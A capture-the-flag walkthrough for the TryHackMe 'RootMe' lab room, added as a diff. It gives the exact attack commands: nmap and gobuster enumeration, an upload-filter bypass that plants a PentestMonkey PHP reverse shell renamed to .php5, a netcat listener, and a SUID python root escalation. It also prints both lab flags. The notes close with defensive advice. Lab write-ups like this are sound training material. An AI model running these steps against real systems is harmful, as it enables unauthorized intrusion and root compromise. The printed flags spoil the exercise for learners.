@@ -1,0 +1,151 @@
+# Author: Royalian28
+Last Updated: 2025-10-11
+
+Scope: High-fidelity walkthrough notes for the "RootMe" TryHackMe room. Contains the exact commands used during enumeration, exploitation, and privilege escalation. Use only in authorized lab environments (TryHackMe sandbox). Do not target production or systems you do not own.
+
+Target / OS
+Linux (Ubuntu-like CTF-style)
+
+Objective
+Obtain `user` and `root` flags by web enumeration, file-upload reverse shell, and SUID-based privilege escalation.
+
+# Enumeration
+Run a service/version scan against the target IP:
+cmmnd: nmap -sV -T4 <TARGET_IP>
+
+Notes & purpose:
+
+* `-sV` detects service versions (helps identify Apache, OpenSSH versions).
+* `-T4` speeds the scan for CTF usage.
+  Takeaway:
+* Found two open ports: 22 (ssh) and 80 (http) — confirm web service and SSH target for later.
+
+Discover hidden web directories with GoBuster:
+cmmnd: gobuster dir -u http://<TARGET_IP> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+
+Notes & purpose:
+
+* Brute-forces common directories to find admin panels or upload points.
+  Takeaway:
+* `/panel/` is discovered and stands out as an interesting target for further inspection.
+
+Open the discovered directory in a browser:
+cmmnd: http://<TARGET_IP>/panel
+
+Notes & purpose:
+
+* Look for upload forms, login pages, or other functionality that can be abused (file upload bypasses, etc.).
+
+
+# Getting a shell (File upload -> Reverse shell)
+
+1. Prepare a PHP reverse shell (PentestMonkey repo was used):
+
+cmmnd : git clone https://github.com/pentestmonkey/php-reverse-shell
+cd php-reverse-shell
+ls
+nano php-reverse-shell.php
+
+Notes & purpose:
+
+* Edit the script to set your listener IP and port (`$ip` and `$port`). This creates a PHP file that, when executed on the target, will call back to your machine.
+
+
+2. Attempt to upload `php-reverse-shell.php` via the panel upload form. If blocked, employ a filename/extension bypass:
+
+cmmnd : cp php-reverse-shell.php php-reverse-shell.php5
+
+Notes & purpose:
+
+* Many upload filters block `.php` explicitly. Renaming to `.php5` (or other allowed extensions) can bypass naive filters and let the server store the file. Takeaway: always try filename or extension variations when uploads are filtered.
+
+
+3. Start a Netcat listener on your machine to catch the reverse shell:
+
+cmmnd: nc -lvnp <LISTENING_PORT>
+
+Notes & purpose:
+* Wait for the incoming reverse connection from the PHP shell once you trigger it on the server.
+
+
+4. Trigger the uploaded shell by browsing the uploaded file:
+
+cmmnd : http://<TARGET_IP>/uploads/php-reverse-shell.php5
+
+Notes & purpose:
+* Visiting the uploaded file executes the PHP on the server and (if the file is a valid PHP executable on that server) creates a reverse connection to your listener. After the connection, you’ll typically receive a limited shell.
+
+
+5. Upgrade the limited shell to an interactive TTY:
+
+cmmnd : python -c 'import pty; pty.spawn("/bin/bash")'
+
+Takeaway:
+* Upgrading the shell improves command line behavior (job control, tab completion) and makes enumerating the filesystem easier.
+
+
+6. Locate the user flag:
+
+cmmnd: find / -type f -name user.txt 2>/dev/null
+cat /var/www/user.txt
+
+Takeaway:
+* `user.txt` was found at `/var/www/user.txt`; reading it yields the user flag: `THM{y0u_g0t_a_sh3ll}`.
+
+
+# Privilege Escalation
+
+1. Enumerate SUID binaries owned by root:
+
+cmmnd : find / -type f -user root -perm -4000 2>/dev/null
+
+Notes & purpose:
+* Finds files with the SUID bit set — potential escalation vectors if any are misused. Takeaway: `usr/bin/python` (SUID) was identified as unusual.
+
+
+2. Consult GTFOBins for exploitation patterns for SUID `python`:
+
+* GTFOBins shows commands to spawn a root shell when `/usr/bin/python` is SUID.
+
+Exploit (run from the compromised shell):
+
+cmmnd: python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+Notes & purpose:
+* `os.execl` replaces the current process with an elevated shell preserving privileges (`-p` preserves effective privileges). Takeaway: this produces a root shell because `python` is SUID root on the box.
+
+
+3. Verify root and capture root flag:
+
+cmmnd : whoami
+ls /root
+cat /root/root.txt
+
+Takeaway:
+* After exploiting the SUID `python`, you obtain root and read the root flag: `THM{pr1v1l3g3_3sc4l4t10n}`.
+
+
+# Post-Exploitation
+* Record both flags and any interesting artifacts:
+
+  * `/var/www/user.txt` (user flag).
+  * `/root/root.txt` (root flag).
+* Do not leave backdoors or tools on the target. Remove any files you uploaded (if the lab permits cleanup) and close shells.
+
+
+# Cleanup
+
+* Exit shells and remove uploaded files you created during the exercise (if permitted by the lab):
+
+
+cmmnd : rm /var/www/uploads/php-reverse-shell.php5
+exit
+
+* Clear any local listeners and temporary files on your attacking host.
+
+
+# Defensive Notes
+
+* File upload filters should not rely solely on file extension checks — validate file content (MIME type, magic bytes), enforce server-side execution policies, and store uploads outside the web root or with safe permissions.
+* SUID binaries should be audited. Avoid granting SUID to interpreters (like python) or remove the SUID bit unless absolutely necessary.
+* Monitor for unusual `nc` or reverse-shell patterns and unexpected file uploads in web directories.
